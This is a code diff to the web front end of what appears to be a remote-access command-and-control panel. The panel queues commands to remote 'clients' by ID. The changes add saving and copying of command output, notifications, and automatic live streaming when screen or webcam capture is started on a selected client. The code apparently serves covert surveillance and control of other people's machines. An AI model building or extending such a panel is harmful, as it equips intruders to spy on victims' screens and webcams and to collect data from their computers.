@@ -773,7 +773,11 @@
         <div class="result-modal">
             <div class="result-header">
                 <h3 id="result-title"><i class="fa-solid fa-terminal"></i> COMMAND OUTPUT</h3>
-                <button class="result-close" onclick="closeResult()"><i class="fa-solid fa-xmark"></i></button>
+                <div style="display:flex;gap:8px;align-items:center">
+                    <button class="result-close" onclick="downloadResult()" title="Save as TXT" style="background:var(--accent);color:#000"><i class="fa-solid fa-download"></i></button>
+                    <button class="result-close" onclick="copyResult()" title="Copy to clipboard" style="background:rgba(255,255,255,0.1)"><i class="fa-solid fa-copy"></i></button>
+                    <button class="result-close" onclick="closeResult()"><i class="fa-solid fa-xmark"></i></button>
+                </div>
             </div>
             <div class="result-body" id="result-body">Waiting for data...</div>
         </div>
@@ -831,6 +835,13 @@
             if(!selectedClient) return;
             logTerminal(`Executing <${action}> on ${selectedClient.substring(0,8)}...`, 'sys');
             ctxMenu.classList.remove('active');
+            
+            // Auto-subscribe to stream when starting screen/webcam
+            if(action === 'screen_start' || action === 'webcam_start') {
+                socket.emit('subscribe_stream', { cid: selectedClient, type: action.replace('_start','') });
+                islandNotify('tv', 'STARTING STREAM...', 'alert', 3000);
+            }
+            
             fetch('/api/panel/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'X-Token': token },
@@ -838,7 +849,10 @@
             })
             .then(r => r.json())
             .then(data => {
-                if(data.ok) logTerminal(`Task queued: ${action} (id: ${data.task_id})`, 'succ');
+                if(data.ok) {
+                    logTerminal(`Task queued: ${action} (id: ${data.task_id})`, 'succ');
+                    islandNotify('bolt', `SENT: ${action.toUpperCase()}`, 'success', 2000);
+                }
                 else logTerminal(`Failed: ${data.error}`, 'err');
             })
             .catch(e => logTerminal(`Network error: ${e}`, 'err'));
@@ -1127,13 +1141,40 @@
         }
 
         // --- 8. Result Modal ---
+        let _resultTitle = '';
         function showResult(title, content) {
+            _resultTitle = title;
             document.getElementById('result-title').innerHTML = `<i class="fa-solid fa-terminal"></i> ${title}`;
             document.getElementById('result-body').textContent = content;
             document.getElementById('result-overlay').classList.add('active');
         }
         function closeResult() {
             document.getElementById('result-overlay').classList.remove('active');
+        }
+        function downloadResult() {
+            const content = document.getElementById('result-body').textContent;
+            const filename = (_resultTitle || 'result').replace(/[^a-zA-Z0-9]/g, '_') + '.txt';
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = filename;
+            document.body.appendChild(a); a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            islandNotify('download', `SAVED: ${filename}`, 'success', 2000);
+        }
+        function copyResult() {
+            const content = document.getElementById('result-body').textContent;
+            navigator.clipboard.writeText(content).then(() => {
+                islandNotify('clipboard', 'COPIED!', 'success', 1500);
+            }).catch(() => {
+                // Fallback
+                const ta = document.createElement('textarea');
+                ta.value = content; document.body.appendChild(ta);
+                ta.select(); document.execCommand('copy');
+                document.body.removeChild(ta);
+                islandNotify('clipboard', 'COPIED!', 'success', 1500);
+            });
         }
 
         // --- 9. Screen Viewer ---
